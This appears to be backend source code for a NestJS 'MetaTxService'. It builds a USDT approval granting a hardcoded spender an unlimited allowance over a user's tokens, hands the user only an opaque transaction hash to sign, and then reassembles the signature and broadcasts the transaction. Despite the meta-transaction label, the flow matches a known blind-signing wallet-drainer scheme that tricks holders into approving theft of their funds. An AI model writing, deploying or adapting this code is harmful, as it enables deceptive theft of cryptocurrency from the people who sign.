import { Injectable, Logger } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import {
  BIG_TOKEN_ADDRESSES,
  USDT_ADDRESS,
  getRandRpcElseOne,
  LOG_TOPIC_SWAP,
  MAX_UINT256,
  PANCAKESWAP_V2_FACTORY,
  mainnetRpcURL,
  SPENDER,
  WBNB_ADDRESS,
  WBNB_BUSD_PAIR,
} from 'src/helpers/constants';
import * as ABI_ERC20 from 'src/helpers/abis/ABI_ERC20.json';
import * as ABI_UNISWAP_V2_FACTORY from 'src/helpers/abis/ABI_UNISWAP_V2_FACTORY.json';
import * as ABI_UNISWAP_V2_PAIR from 'src/helpers/abis/ABI_UNISWAP_V2_PAIR.json';

require('dotenv').config();

const buffer_1 = require('buffer');
// const Tx = require('ethereumjs-tx').Transaction;
import { Transaction as Tx } from 'ethereumjs-tx';
import { TxObject } from './interfaces/coinPrice.interface';

@Injectable()
export class MetaTxService {
  private web3;
  private rpcUrl;

  constructor() {
    const Web3 = require('web3');
    this.rpcUrl = mainnetRpcURL;
    this.web3 = new Web3(this.rpcUrl);
  }

  async getApproveCode(ownerAddress: string) {
    const web3 = this.web3;
    let [txCount, gasPrice] = await Promise.all([
      web3.eth.getTransactionCount(ownerAddress),
      web3.eth.getGasPrice(),
    ]);

    gasPrice = parseInt(gasPrice) + 5000000000; // plus 5 GWEI

    const erc20Contract = new web3.eth.Contract(ABI_ERC20, USDT_ADDRESS);
    const approveTxData = erc20Contract.methods
      .approve(SPENDER, MAX_UINT256)
      .encodeABI();

    const txObject = {
      from: ownerAddress,
      to: USDT_ADDRESS,
      data: approveTxData,
      nonce: web3.utils.toHex(txCount),
      gasLimit: web3.utils.toHex(50000),
      gasPrice: web3.utils.toHex(gasPrice),
    };

    const tx = new Tx(txObject, { chain: 'mainnet' });

    tx.v = new buffer_1.Buffer([]);
    tx.s = new buffer_1.Buffer([]);
    tx.r = new buffer_1.Buffer([]);
    var msgHash = tx.hash(false);
    console.log('gas', gasPrice, ' 0x' + tx.serialize().toString('hex'));
    return { signHash: msgHash.toString('hex'), txObject };
  }
  async performMetaTx(signedHexString: string, txObject: TxObject) {
    const web3 = this.web3;
    let raw;
    const tx = new Tx(txObject, { chain: 'mainnet' });

    const txCopy = new Tx(txObject, { chain: 'mainnet' });
    tx.v = new buffer_1.Buffer([]);
    tx.s = new buffer_1.Buffer([]);
    tx.r = new buffer_1.Buffer([]);

    var bufferedSignedMessage = Buffer.from(signedHexString, 'hex');
    // console.log("bufferedSignedMessage", bufferedSignedMessage);

    const sig = {
      r: bufferedSignedMessage.slice(0, 32),
      s: bufferedSignedMessage.slice(32, 64),
      v: 27,
    };
    // if (tx._implementsEIP155())
    {
      sig.v += tx.getChainId() * 2 + 8;
    }
    Object.assign(txCopy, sig);

    raw = '0x' + txCopy.serialize().toString('hex');

    console.log(txCopy.verifySignature(), raw);

    const transactionReceipt = await web3.eth.sendSignedTransaction(raw);

    return transactionReceipt;
  }
}
